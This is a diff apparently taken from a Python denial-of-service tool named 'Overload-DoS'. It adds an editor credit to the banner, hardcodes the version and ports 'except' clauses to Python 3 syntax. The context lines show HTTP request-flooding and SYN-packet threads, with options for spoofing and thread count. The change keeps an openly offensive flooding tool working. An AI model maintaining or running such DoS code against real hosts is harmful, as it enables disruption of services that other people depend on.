@@ -21,9 +21,9 @@ title = '''
  | |_| |\ V /  __/ |  | | (_) | (_| | (_| |_____| |_| | (_) |__) |
   \___/  \_/ \___|_|  |_|\___/ \__,_|\__,_|     |____/ \___/____/ 
                                                                   
-            Developed by Chris Poole | @codingplanets  			
+            Developed by Chris Poole | Edited by Zypher | @codingplanets  			
 		  https://github.com/codingplanets/Overload-DoS
-		          Version: '''+version+'''
+		          Version: 1.1
 '''
 
 import os
@@ -238,7 +238,7 @@ class Requester(Thread):
 				reqter.request(method.upper(),url,None,http_header)
 		except KeyboardInterrupt:
 			sys.exit(cprint('[+] Attack canceled by user','red'))
-		except Exception,e:
+		except Exception as e:
 			print(e)
 		finally:
 			self.closeConnections()
@@ -329,7 +329,7 @@ class syn(Thread):
 			self.sock.sendto(packet,(self.tgt,0))
 		except KeyboardInterrupt:
 			sys.exit(cprint('[+] Attack Attack canceled by user','red'))
-		except Exception,e:
+		except Exception as e:
 			cprint(e,'red')
 		finally:
 			self.lock.release()
@@ -412,7 +412,7 @@ Example:
 			to = float(args.timeout)
 			st = int(args.spoof)
 			threads = int(args.threads)
-		except Exception,e:
+		except Exception as e:
 			print('[+]',e)
 		while 1:
 			try:
